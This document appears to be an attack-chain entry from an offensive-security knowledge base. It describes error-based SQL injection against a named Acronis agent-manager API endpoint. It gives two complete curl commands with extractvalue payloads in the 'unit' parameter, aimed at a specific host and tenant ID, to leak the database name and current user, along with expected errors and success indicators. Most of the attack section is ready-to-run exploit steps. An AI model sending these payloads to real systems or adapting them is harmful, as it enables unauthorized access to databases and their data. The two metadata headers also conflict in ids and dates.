---
tags:
  - sqli
  - mysql
  - error-based
  - database-leak
  - exfiltration
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Error-Based-SQL-Injection-to-Leak-Database-Name]]'
  - '[[procedures/Error-Based-SQL-Injection-to-Leak-Current-User]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:26.307Z'
description: >-
  Multi-stage attack exploiting SQL injection in the Acronis agent-manager API
  to leak database name and current user via error-based techniques.
skill_level: intermediate
impact_level: high
id: 8692c20d-e12f-4963-8be9-3e16f1a908f6
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
---
id: 123e4567-e89b-12d3-a456-426614174000
name: SQL Injection in Acronis Agent-Manager API to Exfiltrate Database and User Information
type: attack_chain
description: "Multi-stage attack exploiting SQL injection in the Acronis agent-manager API to leak database name and current user via error-based techniques."
verified: false
submitted: false
step_count: 2
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
procedures: [[procedures/Error-Based-SQL-Injection-to-Leak-Database-Name]], [[procedures/Error-Based-SQL-Injection-to-Leak-Current-User]]
techniques: [[Exploit Public-Facing Application]]
tactics: [[Initial Access]], [[Collection]]
tags: sqli, mysql, error-based, database-leak, exfiltration
platforms: Web, MySQL
tools: []
---

# SQL Injection in Acronis Agent-Manager API to Exfiltrate Database and User Information

Multi-stage attack chain demonstrating a complete attack workflow exploiting SQL injection in the Acronis agent-manager API endpoint to achieve data exfiltration via error-based techniques using MySQL's extractvalue function.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via API] --> B[SQL Injection Execution]
    B --> C[Data Exfiltration]
    C --> D[Database Compromise]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser or [[tools/curl]]
- Access to a HTTP client for sending requests

### Target Environment

- Acronis agent-manager API endpoint
- MySQL backend database
- Network access to the target URL (e.g., https://mc-beta-cloud.acronis.com)

### Initial Access Requirements

- Valid tenant_id (e.g., 1590228) for the API
- No authentication required for the vulnerable endpoint in the PoC context
- Knowledge of the base API path: /api/agent_manager/v2/unit_configurations

## Detailed Attack Procedures

### Step 1: Inject SQL Payload to Extract Database Name
procedure: [[procedures/Error-Based-SQL-Injection-to-Leak-Database-Name]]

**Objective**: Exploit the SQL injection vulnerability in the 'unit' parameter to trigger an error that leaks the current database name using MySQL's extractvalue and concat functions.

**Instructions**: Send a crafted GET request to the vulnerable endpoint, injecting the payload into the 'unit' parameter to force an SQL error that reveals the database name prefixed by '~' (char(126)). Use [[commands/curl-sqli-database-leak]] for execution:

```bash
curl -X GET "https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent'%20and%2F%2A%2A%2Fextractvalue(1,concat(char(126),(select%20database())))%20and'%20" -v
```

**Expected Output**: An SQL error message in the response containing the database name, e.g., "XPATH syntax error: '~database_name'".

**Success Indicators**:
- Response includes an extractvalue error with '~' followed by the database name
- No successful API response; error confirms injection

### Step 2: Inject SQL Payload to Extract Current User
procedure: [[procedures/Error-Based-SQL-Injection-to-Leak-Current-User]]

**Objective**: Exploit the same SQL injection vulnerability to leak the current database user information via an error-based technique.

**Instructions**: Send another crafted GET request with the payload targeting the user() function. Use [[commands/curl-sqli-user-leak]]:

```bash
curl -X GET "https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent'%20and%2F%2A%2A%2Fextractvalue(1,concat(char(126),(select%20user())))%20and'%20" -v
```

**Expected Output**: An SQL error message containing the current user, e.g., "XPATH syntax error: '~user@host'".

**Success Indicators**:
- Response shows extractvalue error with '~' followed by user details
- Confirms arbitrary SQL execution potential

## Attack Chain Summary

### Key Achievements

1. Successful injection into the 'unit' parameter without sanitization
2. Exfiltration of sensitive database metadata (name and user)
3. Demonstration of high-severity impact enabling further database compromise

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
